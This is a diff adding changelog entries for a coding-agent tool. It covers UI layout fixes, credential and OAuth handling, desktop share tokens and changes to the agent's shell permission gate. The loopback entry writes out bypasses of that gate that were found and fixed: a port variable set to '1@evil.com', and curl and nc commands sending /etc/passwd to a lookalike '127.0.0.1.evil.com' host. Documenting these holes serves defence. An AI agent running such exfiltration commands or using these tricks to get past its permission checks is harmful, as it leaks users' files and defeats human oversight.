@@ -1,5 +1,612 @@
 # Changelog
 
+## 2026-10-01 — Pulse: a live card now streams its turn on the card itself
+
+The Pulse dashboard exists to watch work happen, but a card's output was
+hover-gated: a `running` row showed its status and current tool call, and the
+actual text appeared only if you hovered it. On a touch device — which has no
+hover at all — the stream was unreachable. The grid also ran to four columns on a
+wide window, squeezing a live card's lines to unreadable width.
+
+- **A live card streams on its own face.** `running`, `needs_permission` and
+  `needs_question` rows enable `usePulseTail` unconditionally
+  (`expanded || streamOnCard`, gated by the new `STREAM_ON_CARD` set) and render
+  the preview in a reserved region on the card. The two needs-you rows are in
+  that set deliberately: a paused turn is live output the user is waiting on, and
+  the ask's summary is already on the card body, so the tail beside it is the
+  context for that ask rather than a historical fetch.
+- **The fetch-cost reason the gate existed still holds, which is why settled rows
+  are unchanged.** A settled card is seeded from a 200-message transcript fetch
+  (`IDLE_FETCH_LIMIT`) and the dashboard pages up to 50 rows, so seeding every
+  card on open would cost a request per card. `idle` and `error` keep the
+  hover/focus gate.
+- **The stream renders in exactly ONE place per card** — the card face for a live
+  row, the overlay for every other status — extracted as one `PulseStream`
+  component so the same lines are never on screen twice and `pulse-tail` stays a
+  unique test hook. `tailOnOverlay` is what stops the overlay repeating a live
+  row's lines; the overlay then shows only what the card body cannot (the plan
+  and the ask).
+- **Card height had to become a floor, not a hint.** With `min-h` below the
+  content, the content governed and a card grew from 224px to 240px as tail lines
+  arrived — reflowing the whole grid row on every streaming delta. Cards are now
+  `h-full` with `CARD_MIN_H = "min-h-[16rem]"`, and both are load-bearing:
+  `min-h` alone still lets a taller card stretch its row, `h-full` alone gives
+  nowhere to stream into. Measured in headless Chromium against the built CSS, a
+  full card plus a full 7-line preview is 240.5px, so 16rem leaves ~15px of slack
+  and the height is genuinely constant. The stream region is `flex-1
+  justify-end`, pinning the newest line to the bottom edge the way a terminal
+  tail reads, with `min-h-0` so it shrinks instead of pushing the card taller.
+- **`PULSE_TAIL_LINES` 6 → 7**, sized to the height the card now reserves: higher
+  would only be clipped there, lower would leave the reserved region empty. The
+  tail tests assert against the constant rather than a typed `6`, so the two
+  cannot drift apart silently.
+- **The grid is capped at 3 columns** (`xl:grid-cols-4` removed, `gap-2` →
+  `gap-3`): a live card reserves a full block for its stream, so a fourth column
+  squeezes those lines, and wider cards also mean fewer lines wrap off — which is
+  the point of the extra height.
+- **Compact (Recent-section) cards are untouched**: one line, no reserved height,
+  hover-gated, and never streamed even when the row is running.
+
+Tests: `Pulse/PulseCard.test.tsx` (+9 — visible with no hover, hook stays enabled
+while collapsed, no duplicate stream in the overlay, seed-fetch failure surfaced on
+the card rather than swallowed, reserved stream height, an idle row still fetches
+nothing until hover, compact never streams, tail trimming) and
+`Pulse/usePulseTail.test.ts` (the cap now asserted against `PULSE_TAIL_LINES`).
+Details: `docs/concepts/pulse-dashboard.md` → "The live card carries its own
+stream".
+
+## 2026-10-01 — Chat input row: every control aligned, and the empty composer stopped scrolling
+
+The composer's Send button shipped at `size="sm"` (`h-9`, 36px) next to a 47px
+textarea, so the row rendered as a ragged bottom-aligned stub; the attach button
+was a 28px square hung off the same baseline. The empty input also showed a
+permanent scrollbar track.
+
+- **One height for the whole row.** The attach button, the textarea and all five
+  action-button branches (Send / Stop / Running… / Waiting for permission… /
+  Resume) now share `.composer-control` (`.composer-control{height:calc(2.8125rem + 2px)}` in
+  `web/src/index.css`) and a matching `rounded-lg`. 47 is the textarea's
+  border-box height for one line — `p-3` (12+12) + `text-sm`/`leading-[1.5em]`
+  (14px × 1.5 = 21px) + a 1px border each side — so their top *and* bottom
+  edges coincide. The row stays `items-end` on purpose: the textarea auto-grows
+  to `max-h-40` and the controls stay pinned to its bottom edge at their base
+  height. The attach button gained an `aria-label` (it previously had only
+  `title`).
+- **The stuck scrollbar was a 2px arithmetic bug, not a styling choice.**
+  `fitTextarea` set `height = scrollHeight`, but `scrollHeight` covers content +
+  padding while `height` is border-box — so the box was 2px short of its own
+  content and an *empty* composer reported `scrollHeight > clientHeight`. It now
+  adds `offsetHeight - clientHeight` (the borders, and any horizontal
+  scrollbar); both are 0 under jsdom, so the modelled tests are unaffected.
+- **An empty composer is now exactly one line at every width.** `fitTextarea`
+  sets an inline height from `scrollHeight`, but **Chrome counts the PLACEHOLDER
+  in a textarea's `scrollHeight`** — so the empty box inherited the
+  placeholder's wrapped height (measured 110px at a 320px viewport vs 47px at
+  1400px). An empty draft now clears the inline height and lets `.composer-control`
+  supply it, which is also the shrink path when a multi-line draft is cleared.
+- **The 110-character placeholder had to go, because no CSS can stop placeholder
+  text owning the box's height.** The shortcut list now lives on the textarea's
+  `title` (`CHAT_INPUT_PLACEHOLDER_HINT`) and the placeholder is
+  `"Type a message…"`. It dominated the box on desktop too — it is what the
+  original screenshot was mostly showing.
+- **The height is `calc(2.8125rem + 2px)`, not a baked `47px`.** Everything
+  except Tailwind's 1px border scales with the user's root font size. Measured at
+  a 20px root: the px form gave buttons 45px against a 56px textarea; the rem
+  form gives 58.3px to all three. At 24px: 69.5px across the board.
+- **A shared height had to be a real CSS class, not
+  `` `h-[${CONST}px]` ``.** Tailwind's scanner reads raw source text and cannot
+  evaluate an interpolation, so the arbitrary value was never emitted — the
+  buttons rendered at intrinsic size with no error. Confirmed in the build:
+  `grep -o '\.composer-control{[^}]*}' web/dist/assets/*.css` →
+  `height:47px`.
+- **Verified in the real app at every width, not just jsdom.** Live probe against
+  a freshly built server at 320 / 430 / 760 / 1100 / 1600 CSS px: textarea,
+  attach and Send all at 47px with **tops and bottoms** aligned,
+  `scrollHeight == clientHeight` (no scrollbar) and no page overflow. Root font
+  16 / 20 / 24px → 47 / 58.3 / 69.5px for all three. Grew to five lines: the
+  textarea becomes 131px and the controls stay on its bottom edge. Before/after
+  on an empty box: old → `offset 45 / client 43 / scroll 45` (overflowing), new →
+  `offset 47 / client 45 / scroll 45`. The `max-h-40` ceiling still caps the box
+  at 160px. Confirmed there is exactly ONE composer (`<ChatInput>` is rendered
+  once, from `App.tsx`) and no mobile/compact variant to shift.
+- **Regression:** `web/src/components/Chat/ChatInput.rowAlign.test.tsx` pins the
+  CSS contract (every row control carries `composer-control`, the row is
+  `items-end` and not `items-center`, and the fit adds the chrome).
+  Ten mutants applied and confirmed caught, including both directions of the
+  empty-composer short-circuit, dropping `composer-control` from each of the
+  three control kinds, `items-end` → `items-center`, dropping the chrome term, and
+  restoring the long placeholder. Two kinds of mutant survive by construction
+  — one that changes only the CSS *number*, and one that changes only how the
+  placeholder wraps — because jsdom loads no stylesheet and has no layout engine.
+  Those two are checked against the built CSS and a real browser instead, and the
+  placeholder split is additionally pinned by asserting the short placeholder
+  plus every hint still present in `title`. Full web suite
+  338 files / 3028 tests green. Desktop/web users need a rebuild: `web/dist` is
+  embedded in the app.
+
+## 2026-10-01 — Loopback curl with a shell-variable port no longer asks as exfiltration
+
+A loopback health check whose port came from a shell variable asked on every
+attempt, with rule `bash.prefix.curl`, no matter what allow rule was persisted:
+
+```
+curl -s -m 3 -o /dev/null -w %{http_code} "http://127.0.0.1:$p/api/health"
+```
+
+- **`url.Parse` is the cause, and the ordering is why the rule looked ignored.**
+  It rejects a non-numeric port outright (`invalid port ":$p" after host`), so
+  `extractDomainFromURL` returned `""`, the loopback carve-out never applied, and
+  the exfiltration gate flagged the command for merely containing `$p`. The
+  harmful gate runs *before* both the loopback auto-allow and every prefix rule
+  in `decideSingleCommand`, so a harmful verdict is an Ask no allow rule can
+  override — while the label still shows the prefix that merely *matched*. Same
+  for `wget`, `localhost:$p`, `${p}` and `[::1]:$p`.
+- **The obvious fix was a trap, and adversarial review caught it.** Recovering the
+  host by hand and ignoring the port — "a port cannot change which host is
+  contacted" — opens a bypass: `p='1@evil.com'` makes
+  `http://127.0.0.1:$p/x` resolve to **evil.com**, and that version returned
+  **allow** in normal and sandbox mode. A shell variable is arbitrary text and
+  can inject a new authority boundary at `@`.
+- **So the port is honored only when proven numeric** (`shellPortIsNumeric`).
+  Two proofs, both readable off the line: a same-line integer assignment
+  (`p=8080; curl …"$p"…`), and a numeric-literal `for` list
+  (`for p in 8080 4096; do curl …"$p"…; done`). The **last** assignment wins —
+  otherwise `p=8080; p='1@evil.com'` is trusted. A bare `$p`, `$(cmd)`, a
+  backtick, `$(seq …)` in a for list, and `${PORT:-8080}` all stay gated. Only
+  the port may vary; a variable *host* (`http://$h/`) never does.
+- **What this does and does not fix.** The loopback health check no longer gets
+  flagged as *exfiltration* — an Ask no rule can override. A bare `$p` with
+  nothing on the line proving its value **still asks**: that is deliberate, since
+  the spelling of an expansion proves nothing and trusting it is the bypass above.
+  Put the port on the line and it no longer prompts.
+- **Closed a security hole in the same predicate.**
+  `isLoopbackHost` / `isLocalhostDomain` matched 127.0.0.0/8 with
+  `strings.HasPrefix(host, "127.")`, so a registrable domain an attacker controls
+  — `127.0.0.1.evil.com` — counted as loopback. `nc 127.0.0.1.evil.com 80` was
+  auto-allowed outright, and `curl -d @/etc/passwd http://127.0.0.1.evil.com/api`
+  rode the carve-out past the exfiltration gate. Both now parse with
+  `netip.ParseAddr`.
+- **The two directions are deliberately asymmetric.** The self-escalation guard
+  (`permissionApiLoopback`) must *over*-ask: the inet_aton shorthands `127.1`,
+  `0177.0.0.1`, `2130706433` and `0x7f000001` all reach loopback, and narrowing
+  that guard would fail **open**. New `parseLooseInetAton` recognises them while
+  never reading a hostname as an address.
+- **Whole-line context had to be threaded to every gate.**
+  `parseShellCommandLine` lifts `p=8080` into its own fragment *and discards a
+  `for p in …` header entirely*, so per-fragment gates were blind to both — in the
+  normal loop and, independently, in sandbox's per-constituent loop. The
+  numeric-port set is therefore gathered from the raw line as well as the
+  fragments, at both sites.
+- **Verified.** Twelve tests in `permissions_loopback_portvar_test.go` cover the
+  allow and reject sides, the bypass, the shadowed assignment, the inet_aton
+  forms, the `for` recognition, the real `pm.Decide("bash", …)` entry point in
+  normal/yolo/sandbox, and a no-regression check that `127.0.0.2`/`127.0.0.53`
+  and the rest of 127/8 still resolve as loopback while RFC1918 does not.
+  Seven mutants mutation-verified CAUGHT, each confirmed to compile first; additionally `TestLoopbackPortProofIsLoadBearing` was re-checked by reverting only `shellPortIsNumeric` (the bare-`$p` case then flips to allow and the test fails), then restored byte-identical. One
+  mutant survived and turned out to be an *equivalent* mutant proving a
+  per-field exemption was unreachable dead code — removed rather than left with a
+  misleading rationale. `go build ./...` exit 0, `go vet` clean, `gofmt` clean,
+  and **`go test -race ./internal/agent/` exit 0**; full `internal/agent` plus
+  `internal/server`, `internal/tui`, `internal/tool`, `internal/browse`,
+  `internal/mcp`, `internal/config`, `internal/shell/...` green. See
+  `docs/gotchas/loopback-curl-shell-port-variable.md`.
+
+## 2026-10-01 — Files tab: right-click an editor/preview tab to show it in the file tree
+
+The Files tab's tab bar now has a per-tab context menu with one item, **Show in file tree**: it expands the file explorer to that file's nested location and scrolls it into view, so "where is this file" stops meaning expanding folders by hand.
+
+- **Works for preview tabs too, not just code.** The tab bar carries both Monaco and viewer tabs (PDF/Office/media live in the same `editorTabs` array), so one action covers everything the Files tab can show. Right-clicking makes the tab active first, the way every other tab context menu behaves.
+- **It finds the file whichever way the tab was opened.** Tree nodes are addressed root-relative (`filepath.Rel` in `buildFileTree`), while a tab's path can be absolute (chat file link, `preview_open`) or relative. `components/Files/fileTreeReveal.ts` reconciles the two with no network round trip, and reports "outside the browsed folder" instead of guessing when they genuinely disagree (e.g. an absolute path against a `~`-rooted remote project).
+- **No silent no-ops.** Before expanding, the request resolves every way the row could be missing: a different browsed root (it switches to the tab's root when it can), an active filter or content-search view (cleared), Miller-column view (switched to list), and a path under a directory the server walk hides (notice). If the target's own directory loads without the file, the tree says so immediately rather than after a timeout.
+- **Revealing the same file twice works.** The request carries a nonce and the highlight a sequence number — without them, a repeat reveal is a same-value React no-op and silently does nothing.
+- **Verified in a real browser, not just jsdom.** The tab bar, the tree and a real App are wired together in `App.revealInTree.test.tsx` (including a reveal into a collapsed tree pane); the scroll itself was checked live — the row lands dead centre of the tree viewport (`scrollTop` advanced, 0px offset) after the ancestors expanded from collapsed.
+
+## 2026-10-01 — Settings → Connectors: manage provider credentials from the web/desktop UI
+
+Settings gained a **Connectors** group (listed just above Profiles) that manages the **base** credential store — the same `auth.json` the TUI `/connect` dialog and opencode itself read — so connecting a provider no longer requires the TUI or hand-editing a JSON file.
+
+- **Provider list with live status and a masked key.** Every provider in the catalog is listed with `auth.Status`'s symbol and detail, plus a server-masked credential (`sk-a••••b123`). The status string is rendered verbatim; the SPA never re-derives "connected" client-side.
+- **Connect, Test, Remove.** Save a key, probe a stored credential and see the server's own error, or remove one. Remove goes through `common/ConfirmDialog` — native `confirm()` silently returns false in the desktop webview, which would have made it unreachable there.
+- **The filter is load-bearing.** The catalog is ~40 providers, so it matches on label **and** id.
+- **A newly-set key takes effect on the next turn of any live session.** `auth.CredentialVersion()` now covers the base store as well as profile overlays, so `reconcileProfileAgent` rebuilds a resident agent instead of leaving it on the old key.
+- **`/connect` has one method catalog.** `auth.MethodsFor` in `internal/auth` is now the single source for which connect methods a provider offers; the TUI dialog and the server endpoint were verbatim copies that had begun to drift, and both adapters are parity-tested against it.
+
+Credentials in Settings are for **this machine**: the panel is a global surface, so it passes no `host`. The API client methods all accept one, and thread it, because a remote project's credentials are a different store entirely. OAuth sign-in (paste-code, localhost callback, device code, cookies, plugin) is the next phase and lands on these same endpoints.
+
+## 2026-10-01 — Manual (paste-back) OAuth completion for ChatGPT
+
+The ChatGPT login flow binds `127.0.0.1:1455` on the machine running ocode and
+waits for the provider to redirect the *browser* there. That only works when the
+browser and ocode share a host, so it fails against a `serve --remote` server
+behind SSH/WSL and from a browser on a second device — the redirect lands on the
+browser's own localhost and never reaches ocode.
+
+- `auth.StartOpenAIOAuthManual` builds the same authorize URL with fresh PKCE
+  material and binds **no port at all**. `auth.ExchangeOpenAIManual` completes
+  the flow from whatever the user pastes back. `internal/auth/openai_oauth_manual.go`,
+  kept separate from `openai_oauth.go` because only the manual mode can be driven
+  from a server that is not on the user's machine.
+- **A bare code is refused, deliberately.** It carries no `state`, so there is
+  nothing to validate it against; accepting one would let anyone who can get the
+  user to paste a code of their choosing bind their account to this machine. The
+  cost is one extra copy (the whole redirect URL). An implementation test
+  originally asserted the opposite and was corrected — the implementation was
+  right.
+- **Reachable from the UI.** `startOpenAIConnectFlow` takes a `mode`, and
+  `api.startConnectFlow(provider, method, host?, mode?)` sends it — the client
+  chooses because `remoteMode` lives on `*Server` and these routes are
+  `s.handler.*`, so the handler cannot read it. An absent or unrecognised
+  `mode` is `auto`, so the default behaviour is unchanged. A manual flow comes
+  back `state: "waiting_input"`, which is what makes the UI show a paste box
+  rather than wait on a listener; the auto start response now reports `state`
+  too, so a client can branch without a second poll.
+- The auto/manual separation is enforced by flow STATE, not by a guard: an auto
+  flow is `waiting_browser`, and the input handler's `isWaitingInput()` check
+  rejects a paste before the switch. A first draft added a defensive
+  "manual flow without state" check; the mutation removing it survived, and it
+  was provably unreachable, so it was deleted rather than left implying a case
+  that cannot occur.
+- `internal/server/handler_connect_secrets_test.go` pins that the flow-status and
+  flow-start payloads never carry the PKCE verifier or the OAuth state. They are
+  safe today by construction — the fields are unexported and `snapshot()` builds
+  an explicit DTO — and the guard exists because the failure mode is invisible:
+  adding a `json` tag would start leaking a live credential while every other
+  flow test still passed. Mutation-verified by leaking both fields from
+  `snapshot()`.
+
+## 2026-10-01 — Setting a provider key now reaches live sessions, and /connect has one shared method catalog
+
+Building the web/desktop Connectors settings (TUI `/connect` parity) surfaced
+two things worth fixing on their own, both of which made a freshly-set key look
+like it had not worked.
+
+- **A base-store credential edit did not invalidate a resident agent.** Setting a
+  key writes the base store (`auth.json`) — via the TUI `/connect` dialog or
+  `PUT /api/auth/connect/{provider}`. An agent resolves its API key at client
+  construction (`agent.NewClientWithProfile`), so a live session kept sending the
+  old key. `reconcileProfileAgent` already rebuilds on a credential-version
+  mismatch, and its comment states the version is "global, not per-profile: an
+  in-place edit must invalidate the cached client" — but only the PROFILE store
+  bumped that counter. It now covers both: `auth.CredentialVersion()` is one
+  counter bumped by `auth.Set` and `auth.Remove` (and by the profile store's
+  four write paths), deliberately not two summed — two monotonic counters can
+  collide, and a collision is a missed invalidation. `ProfileCredentialVersion()`
+  is kept as the legacy name and delegates.
+  The bump is in `Set`/`Remove`, **not** in `persistLocked`, even though the
+  latter looks like the obvious single choke point: `persistLocked` also runs on
+  the seed-on-load path, which materialises an empty `auth.json` without changing
+  any credential, and bumping there invalidates every agent in the process for a
+  write that changed nothing.
+  Prompt caching is unaffected: rebuilding a client touches neither the `tools`
+  array nor the cached system prefix. The rebuild still lands on the next turn,
+  never mid-turn — the same contract as a model switch.
+- **Test sessions now snapshot the version too.** `agentSession.credVersion` is
+  load-bearing, and a hand-built `&agentSession{...}` literal left it at 0, which
+  `reconcileProfileAgent` reads as "credentials changed since build". That was
+  harmless while nothing but the rarely-exercised profile store moved the counter;
+  once base writes moved it, any earlier credential write anywhere in the binary
+  turned those sessions into a spurious rebuild — which a `fake-model` session
+  cannot survive, since the model has no provider to resolve. The shared
+  `newTestSession` helper now snapshots it, as do the few literals that bypass
+  the helper, with the reason recorded at each site.
+- **`/connect`'s method catalog existed twice.** `tui/connect.go` `buildMethods`
+  and `server/handler_connect.go` `connectMethodsFor` were near-verbatim copies
+  — same ordering, same `OAuthFlow` switch, same Grok subscription special case.
+  Both now render from `auth.MethodsFor` (`internal/auth/methods.go`), which
+  derives each method's `Kind` (`apikey`/`oauth`/`plugin`/`remove`) once; the TUI
+  appends its own trailing "cancel" affordance, which is dialog chrome rather than
+  a way to connect. Parity tests assert both adapters against the shared catalog
+  for every provider, in both the connected and unconnected shapes.
+
+## 2026-10-01 — Desktop shares keep working after a restart, and can be reset
+
+The desktop app minted a fresh auth token every launch, and the *Share Entire
+Desktop* URL embeds that token — so any link handed to another phone, laptop,
+or colleague died (401) the moment ocode was restarted. The listen port was
+already sticky for exactly this reason; the credential half was not.
+
+- **A second credential, not a reused one.** `server.SetShareToken` installs an
+  optional second token that `checkAuth` accepts alongside the launch token
+  (`tokenMatches`). The webview keeps using the per-launch token, so rotating
+  the share token never logs the local window out and never needs a reload.
+- **Persisted, owner-only**: `desktop.ShareTokenStore` keeps it in
+  `~/.config/opencode/desktop-share-token` (0600, beside `desktop-port`).
+  A missing, unreadable, or malformed file mints a fresh one; a truncated write
+  can never silently replace a working link.
+- **Reset** rotates it immediately — every outstanding link 401s at once while
+  this window stays connected. Exposed as Share menu ▸ *Reset Share Token…*
+  (`ocode:reset-share-token`) and as a button in the share dialog. The menu
+  item only arms an inline confirmation; it never revokes silently, and a
+  failed reset keeps the previous link and says so.
+- Both routes are mounted with the new `server.HandleAuthedDesktopRoute`
+  (behind `authMiddleware`). `HandleDesktopRoute` stays unauthenticated for
+  the one-time storage-migration call — but the listener binds `0.0.0.0` so
+  share URLs connect, so a credential route must never use it.
+- Registered in `StartServer` **after** the saved-port fallback, which replaces
+  `srv` wholesale and would otherwise drop the routes.
+- Unchanged elsewhere: plain `ocode serve` and remote-workspace sessions get no
+  share token, the endpoint 404s, and the SPA falls back to `authToken()`.
+- Tests: `internal/server/share_token_test.go`,
+  `internal/desktop/share_token_test.go` (including a full
+  `StartServer` → relaunch → reset lifecycle), and 7 new cases in
+  `web/src/components/Layout/ShareDialog.test.tsx`.
+
+## 2026-10-01 — Cancel an in-flight compaction from the web/desktop UI
+
+Compaction could not be interrupted: `runCompact` built its context from
+`context.Background()` (independent of the agent stop channel and the HTTP
+request), so neither the composer's Stop nor aborting the `/compact` fetch
+stopped a running pass — a long summary could only be waited out.
+
+- New `POST /api/sessions/{id}/compact/cancel` → `Handler.HandleCancelCompaction`
+  calls `Agent.CancelCompaction()`, which cancels **every** in-flight pass for
+  the session (manual and automatic) with a new `ErrCompactionCanceled` cause.
+  Idempotent: `{cancelled:false}` when nothing is compacting.
+- **A user cancel is deliberately distinct from a bare provider
+  `context.Canceled`.** A provider cancellation observed while the request is
+  alive is still a 500 (`TestCompactSessionBareCancellationRemains500`); only
+  `ErrCompactionCanceled` is treated as a clean stop, which becomes
+  `compaction_done{ok:true}` so the shared indicator clears on every client with
+  no error banner. A cancel does not latch auto-compaction off.
+- **Stop now also cancels compaction** (`interruptSessionWork`), including the
+  manual-compact case where no turn is active — without recording
+  `pendingCancel`, which would poison the next turn.
+- The pass is registered **before** `OnCompactStart`, so a client that reacts to
+  `compaction_started` by cancelling always finds a registered pass.
+- Web/desktop: a Cancel button on the running-compaction bar
+  (`CompactionCancelButton`), shown by both `CompactionStatus` (auto and
+  other-client passes) and `CommandActivityBar` (this client's own `/compact`,
+  which `CompactionStatus` suppresses). Success is confirmed by the server's
+  terminal frame, so every client converges.
+- Tests: `internal/agent/compact_cancel_test.go`,
+  `internal/server/compact_cancel_test.go`,
+  `web/src/components/Chat/CompactionCancelButton.test.tsx`.
+
+## 2026-10-01 — Status bar shows context-window usage with % and pressure color
+
+The web/desktop status bar's ctx segment (`ctx: 12k/200k`) reported token
+counts but no occupancy, so a nearly-full context window looked the same as
+a fresh one. It now shows the percentage and colors it by pressure, matching
+the CoworkSidebar gauge and the Chat tab memory badge: green under 65%,
+yellow from 65%, red from 85%.
+
+- `contextPercent` derives the percentage from the snapshot's
+  `context_current_tokens` / `context_max_tokens` — the same server chain
+  the context gauge already uses (provider-reported occupancy first,
+  transcript estimate fallback). No new resolution logic was added on the
+  client.
+- Unknown occupancy (no provider reading yet) or an unknown window keeps the
+  old muted `ctx: ?/200k` form with no percentage, rather than fabricating
+  a 0%.
+- Values over 100% clamp to 100, so a provider that rounds past the window
+  can't push the gauge off-scale.
+- The percentage text is the non-color signal; color alone never carries the
+  meaning. The tooltip keeps the raw token counts.
+
+## 2026-10-01 — `/connect` gains a filterable keyword input
+
+The provider stage listed all 30 providers with no way to narrow it, so finding
+Grok meant scrolling and counting. It now has a filter input: type to narrow,
+`↑`/`↓` to move within the results, `Enter` to connect, `Esc` to clear the
+filter and (again) to close.
+
+- **Matching reuses the model picker's matcher** (`modelPickerMatches`,
+  keyword-AND-fuzzy) over `label + id + connection status`, rather than adding a
+  second filter implementation with different semantics. A query can target the
+  status too, so `api key` / `env` / `not configured` lists the providers already
+  configured (or not).
+- **The filter row occupies the blank spacer** that used to sit between the
+  header and the list, so every provider row keeps its screen offset
+  (`y = 3 + filteredIndex`) and mouse clicks still land on the row the user
+  sees. The row is clamped to one line for the same reason — a wrapped input
+  would push every row down by one.
+- **`↑`/`↓`, `Enter` and mouse clicks all resolve through the filtered list**,
+  so they act on the highlighted row rather than the raw catalog index, and the
+  selection snaps to the first match whenever an edit filters the current
+  provider out. Leaving the provider stage clears the filter: keeping it made
+  the next character typed append to the stale query.
+- **`Esc` peels one layer at a time** — clear the filter first, close on the
+  second press — instead of closing outright with the query silently discarded.
+- **Provider status is snapshotted once per dialog** instead of on every render.
+  `auth.Status` re-reads the opencode config for every unconfigured provider,
+  which was tolerable once per render but not once per keystroke now that the
+  list is interactive. Safe because every credential write in the connect flow
+  ends at the message stage, whose `Enter`/`Esc` closes the dialog.
+
+Regression suite: `internal/tui/connect_filter_test.go` (11 tests). Six mutations
+were verified to fail it, including `selectConnectRow` ignoring the filter
+mapping, `ensureProviderSelected` as a no-op, an unfiltered row hit test,
+`Esc` closing outright, the filter row not rendering, and navigation clamped to
+catalog size.
+
+## 2026-10-01 — Changes tab no longer invents thousands of change rows from one bash command
+
+A session with **13 edited files** showed **4,347 rows** in the changes tab, and
+**4,214 of them carried the same timestamp and the same command**: a
+`cd <workdir> && cat >> TODO.md`. Three defects in the pre/post stat-walk
+detector (`internal/changes/bash.go`) compounded.
+
+- **A truncated fingerprint walk was diffed as if it were complete.** `Pre()`
+  has a 2s budget and, on a loaded machine, gave up partway through the tree
+  (measured: the repo root walks in 90–150ms, so ~20x of contention is enough).
+  `diffFingerprints` reports every path *missing from the pre-walk* as
+  `BashAdded`, so all the files the walk never reached read as brand new. The
+  baseline now carries `complete`; an incomplete pre- **or** post-walk discards
+  the event and records a `SkipNotice` instead of inventing rows.
+- **A `cd` was treated as a target.** Every command opens
+  `cd <workdir> && …`, and touch matching is deliberately permissive (a
+  candidate matches as a substring of the path, either direction), so a
+  *directory* token admitted every file beneath it and the "intersect with the
+  command's paths" filter filtered nothing at all. Tokens naming the workDir or
+  an ancestor of it are now dropped as locations — subdirectory targets like
+  `<workdir>/docs` are kept, so `cp -r` detection survives.
+- **Nothing bounded one event.** A single event may now contribute at most
+  `maxTouchesPerEvent` (200) paths, and the registry refuses new paths past
+  `maxTrackedFiles` (5,000). A bulk rewrite (`gofmt -w .`, a codemod) is
+  dropped rather than half-listed.
+
+**Skips are now visible.** A dropped event records a `SkipNotice`
+(`Registry.BashSkips()`, newest 20) and emits a `WARN` line in the debug panel —
+discarding silently is what made this undiagnosable after the fact. A new
+`BashBaseline.applicable` flag keeps the "no workDir bound / root too large to
+walk" case silent, since an inactive recorder is configuration, not a fault.
+
+**Deliberately unchanged:** a command that names no path at all (`cat >>
+TODO.md` yields no slash-bearing token) still has its diff attributed, but only
+while it stays under the cap. That bounded fail-open is what keeps heredocs and
+in-place `sed`s visible; unbounded, it is how a concurrent writer's files became
+one command's changes.
+
+## 2026-10-01 — Web/desktop chat now says what is running: blocking slash commands and loaded skills
+
+Two kinds of work were invisible in the chat. A client-side command like
+`/recap` awaits a server-side LLM call (`HandleRecapSession` emits **no SSE
+frames at all**), so nothing in the chat store or `live` buffer could stand in
+for it — the composer looked frozen for the whole call. And a skill the model
+loaded showed only a bare `skill` tool block with `{"name":"..."}` hidden in a
+collapsed JSON pane, so a long `git-commit-push` gave no sense of a named skill
+driving the turn.
+
+- **New `web/src/lib/commandActivity.ts`** — per-session store (same shape as
+  `compactionState.ts`) holding either an in-flight `command` or the `skill`
+  loaded this turn.
+- **Generic command coverage from one place.** `App.handleCommand` wraps its
+  single `await dispatchCommand(...)`, so `/recap`, `/share`, `/mask`, `/btw`
+  and anything added later are covered with no per-command bookkeeping.
+- **New `CommandActivityBar`** above the composer, styled to match
+  `CompactionStatus`: spinner, label and a ticking elapsed counter on one
+  clamped row.
+- **A 400ms render-side hold**, so instant commands (`/yolo`, `/effort`) never
+  flash a bar. Activity is always recorded — this filters painting, not
+  coverage.
+- **A skill bar lasts the turn, not the tool call.** A `skill` call returns
+  instantly (it only reads SKILL.md), so the bar is recorded on `tool_start` and
+  cleared on `turn_started`/`turn_done`/`turn_error` — plus `useChat.stop`,
+  since an abort emits neither turn-end frame and would otherwise hang the bar
+  for the rest of the session. No new SSE event: the existing `tool_start` is
+  reused, so the event lists are untouched.
+- **Stale-cleanup guard.** A slow command resolving after the user moved on
+  clears by entry identity (reference equality), so it cannot erase a newer
+  live indicator.
+- **`/reset-id` moves the entry** (`rekeySessionActivity`), per the repo rule
+  that any session-keyed map must move with a rekey.
+- **Transcript parity:** `toolHint.ts` renders `Skill "name"` for `skill` and
+  its `load_skill` alias, matching the TUI's arrow-Skill-quoted-name form.
+- **Deliberately informational** — the bar does not feed `ChatInput`'s `busy`,
+  so send-blocking and queue draining are unchanged.
+- **`/compact` no longer paints twice.** Mounted next to `CompactionStatus`,
+  the new bar stacked a second spinner-plus-elapsed row on the older
+  "Compacting conversation… 17s elapsed" one. `CompactionStatus` now suppresses
+  its running row while `CommandActivityBar` is reporting this client's own
+  in-flight `/compact`. The suppression is deliberately narrow, because that
+  bar is load-bearing for cases the command bar cannot see: a compaction
+  started by **another** client (the cross-client `compaction_started`
+  indicator) or by a server-side automatic pass has no local command activity,
+  so it still gets the bar. An unrelated skill bar also coexists with it rather
+  than displacing it. The queued and failed rows are untouched — the dismiss X
+  is now gated on the error state explicitly, since a suppressed active state
+  would otherwise have rendered a button that `dismissCompaction` refuses.
+
+Tests: `lib/commandActivity.test.ts`, `Chat/CommandActivityBar.test.tsx`,
+`lib/sessionEvents.skillActivity.test.ts`, `App.commandActivity.test.tsx`,
+`Chat/toolHint.test.ts`, `Chat/ChatInput.compaction.test.tsx` (44 + 2 new).
+Mutation-verified — removing the `finally` cleanup, zeroing the 400ms delay,
+dropping the `load_skill` alias, and removing the `/compact` suppression each
+fail a test.
+
+## 2026-10-01 — Every substantive response now closes with a caveman-style recap
+
+`/recap` already summarised a conversation on demand via a side query, and a
+short auto-recap line fired after each turn — but neither shaped what the agent
+itself writes, so a "here's what I did" summary meant whatever shape the model
+happened to pick. The format is now a contract in the system prompt.
+
+- **New `[ocode:recap]` system fragment** (`internal/agent/prompt.go`), a static
+  const appended right after the mode fragment: `ASKED` → `WORKED` → `FOUND` →
+  `DECIDED` → `NEXT`, caveman style, with a `BOTTOM LINE:` conclusion line and a
+  skip rule so it does not fire about conversational turns or tool-only turns.
+- **`WORKED` is adaptive, not fixed wording.** The model labels it `BUILT` for a
+  new feature, `FIXED` for a bug, or `CHANGED` for a refactor/config/docs — so a
+  feature recap says what was *built* rather than forcing "what was fixed".
+- **`NEXT` items each carry their reason** (what to do, then why it matters), and
+  `None — <reason>` when nothing is pending.
+- **Primary agents only.** `NewAgent` enables it; dispatched sub-agents, `/btw`
+  side queries and the advisor opt out explicitly — their output is a tool result,
+  not a user-facing response, and they only see a slice of the conversation. The
+  opt-out is load-bearing because a child inherits the parent's config pointer.
+- **Cache-safe by construction.** Static text in the cached system-role prefix;
+  a test pins byte-stability across `BasePromptMessages()` calls. Existing
+  sessions re-cache the prefix once.
+
+## 2026-10-01 — Discovery now inlines the body of the one skill Jev is confident about
+
+Discovery advertises skills by NAME only (a cached, system-role index) and relies on
+the model choosing to call the `skill` tool for the body — a round trip, and one the
+model can skip. When the TypeSafe judge is confident that a single skill is the right
+one, that round trip is now spent up front.
+
